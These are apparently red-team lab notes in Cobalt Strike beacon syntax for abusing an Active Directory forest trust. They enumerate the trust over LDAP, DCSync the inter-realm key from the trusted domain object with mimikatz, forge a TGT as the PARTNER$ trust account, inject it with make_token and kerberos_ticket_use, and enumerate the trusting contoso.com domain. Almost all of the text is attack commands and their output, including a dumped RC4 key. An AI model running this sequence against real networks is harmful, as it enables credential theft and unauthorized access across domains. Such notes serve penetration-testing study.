enumerate the trust
    beacon> ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
    we see the trust direction is 2, which is TRUST_DIRECTION_OUTBOUND
    we see the trust attribute is 8, which is TRUST_ATTRIBUTE_FOREST_TRANSITIVE
to access resource on contoso, we need to impersonate the trust account
first we need to obtain the TDO's objectGUID attribute
    beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
        objectGUID: 288d9ee6-2b3c-42aa-bef8-959ab4e484ed
let's inject a tcp payload into a process run by PARTNER/vwebber
now let's use the new beacon to dcsync the shared inter-realm key from the TDO
    beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
        * rc4_hmac_nt       6150491cceb080dffeaaec5e60d8f58d
now request a TGT for the trust account
    beacon> krb_asktgt /user:PARTNER$ /rc4:6150491cceb080dffeaaec5e60d8f58d /domain:contoso.com /dc:lon-dc-1.contoso.com
save to desktop
    PS C:\Users\Attacker> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\tgt.kirbi", [Convert]::FromBase64String("[TGT]"))
now inject into logon session
    beacon> make_token CONTOSO\Administrator FakePass
    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\tgt.kirbi
    beacon> run klist
        Cached Tickets: (1)
        #0>	Client: PARTNER$ @ CONTOSO.COM
            Server: krbtgt/contoso.com @ CONTOSO.COM
now we can enumerate the trusted domain
    ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
